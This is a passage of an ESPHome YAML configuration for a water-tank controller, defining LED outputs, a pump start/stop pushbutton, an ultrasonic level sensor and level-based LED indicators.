    optimistic: true
    step: 1
    restore_value: true
    unit_of_measurement: minutes
    mode: box

output:
  - platform: gpio
    pin: GPIO26
    id: red_led_output
  - platform: gpio
    pin: GPIO23
    id: yellow_led_1_output
  - platform: gpio
    pin: GPIO18
    id: yellow_led_2_output
  - platform: gpio
    pin: GPIO19
    id: green_led_output
  - platform: gpio
    pin: GPIO27
    id: blue_led_output

light:
  - platform: binary
    name: ""Red LED""
    id: red_led
    disabled_by_default: True
    output: red_led_output
    internal: False
    restore_mode: RESTORE_DEFAULT_OFF
    effects:
      - strobe:
          name: Blink
          colors:
            - state: true
              brightness: 100%
              duration: 500ms
            - state: false
              duration: 500ms
  - platform: binary
    name: ""Yellow LED 1""
    id: yellow_led_1
    disabled_by_default: True
    output: yellow_led_1_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Yellow LED 2""
    id: yellow_led_2
    disabled_by_default: True
    output: yellow_led_2_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Green LED""
    id: green_led
    disabled_by_default: True
    output: green_led_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Blue LED""
    id: blue_led
    disabled_by_default: True
    output: blue_led_output
    effects:
      - strobe:
          name: Double Blink
          colors:
            - state: true
              brightness: 100%
              duration: 150ms
            - state: false
              duration: 200ms
            - state: true
              brightness: 100%
              duration: 150ms
            - state: false
              duration: 500ms

binary_sensor:
  - platform: gpio
    pin:
      number: GPIO33
      mode:
        input: true
        pullup: true
      inverted: true
    name: ""Pushbutton""
    id: start_button
    filters:
      - delayed_on: 100ms
    on_press: 
      then:
        - if:
            condition:
              - switch.is_off: water_pump
            then:
              - button.press: button_start
              - delay: 1s
            else:
              - button.press: button_stop
              - delay: 1s
        

  - platform: template
    name: ""Water Level OK""
    id: water_level_ok
    lambda: |-
      if (id(ultrasonic_sensor_distance).state < id(safe_distance_m).state) {
        //there is enough water
        return true;
      } else {
        //there is not enough water
        return false;
      }
    on_state:
      then:
        - lambda: |-
            if (x == false) {
              id(blue_led).turn_on().set_effect(""Double Blink"").perform();
              id(water_pump).turn_off();
            } else {
              //do nothing
            }
    on_press: 
      then:
        - light.turn_off: blue_led
        
  - platform: template
    name: ""Pump Status""
    id: pump_status
    device_class: running
    lambda: |-
      return id(water_pump).state;

sensor:
  - platform: ultrasonic
    trigger_pin: GPIO22
    echo_pin: GPIO21
    name: ""Level Sensor Distance""
    id: ultrasonic_sensor_distance
    device_class: distance
    update_interval: 1s
    pulse_time: 10us
    timeout: 20m
    filters:
      - sliding_window_moving_average:
          window_size: 15
          send_every: 15

  - platform: template
    name: ""Water Level""
    id: water_level
    lambda: |-
        return id(ultrasonic_sensor_distance).state;
    update_interval: 1s
    accuracy_decimals: 0
    unit_of_measurement: ""%""
    filters:
      - lambda: return ((100 - 0)/(id(full_distance_m).state - id(empty_distance_m).state)) * x + (100 - (((100 - 0)/(id(full_distance_m).state - id(empty_distance_m).state)) * id(full_distance_m).state));
      - clamp:
          min_value: 0
          max_value: 100
          ignore_out_of_range: false
    on_value_range: 
      - below: 20
        then:
          - light.turn_off: green_led
          - light.turn_off: yellow_led_1
          - light.turn_off: yellow_led_2
          - light.turn_on:
              id: red_led
              effect: Blink          
      - above: 20
        then:
          - light.turn_on:
              id: red_led
              effect: None
      - below: 40
        then:
          - light.turn_off: green_led
          - light.turn_off: yellow_led_1
          - light.turn_off: yellow_led_2
      - above: 40
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
      - below: 60
        then:
          - light.turn_off: yellow_led_2
          - light.turn_off: green_led
      - above: 60
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
          - light.turn_on: yellow_led_2
      - below: 80
        then:
          - light.turn_off: green_led

      - above: 80
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
          - light.turn_on: yellow_led_2
          - light.turn_on: green_led"
